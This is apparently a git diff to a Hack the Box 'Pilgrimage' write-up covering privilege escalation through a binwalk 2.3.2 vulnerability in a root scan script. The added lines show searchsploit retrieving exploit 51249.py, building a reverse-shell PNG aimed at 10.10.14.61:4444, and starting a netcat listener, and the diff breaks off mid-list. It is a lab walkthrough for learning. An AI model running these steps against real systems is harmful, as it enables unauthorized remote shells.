@@ -130,4 +130,30 @@ ps -aux
 - Contents of `/usr/sbin/malwarescan.sh`
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c61faa6e-3264-4917-a728-9faef849e886)
 
-The bash script uses a command `inotifywait` to monitor a directory for newly created files and then checks if the content of those files contains certain blacklisted phrases using the `binwalk` tool.
+- The bash script uses a command `inotifywait` to monitor a directory for newly created files and then checks if the content of those files contains certain blacklisted phrases using the `binwalk` tool.
+- binwalk version 2.3.2
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/33e56901-7cee-48a7-9490-5a39a42abc38)
+
+### Search Exploits
+```
+searchsploit binwalk
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/13ca1261-42a7-4550-859e-a0ded4e1810f)
+```
+searchsploit -m python/remote/51249.py
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ef00376b-efa4-4888-b85a-642cb5318652)
+
+- Prepare Payload
+```
+python3 51249.py poison.png 10.10.14.61 4444 
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/378aa7bf-e083-41ed-a953-0fa7154bb520)
+
+- Start a netcat listener
+```
+rlwrap nc -nlvvp 4444
+```
+
+- Upload the payload file (binwalk_exploit.png) to the target. Since the bash script `malwarescan.sh` uses the binwalk tool to scan the images uploaded to the `/var/www/pilgrimage.htb/shrunk` directory, the payload needs to be placed here.
+- 
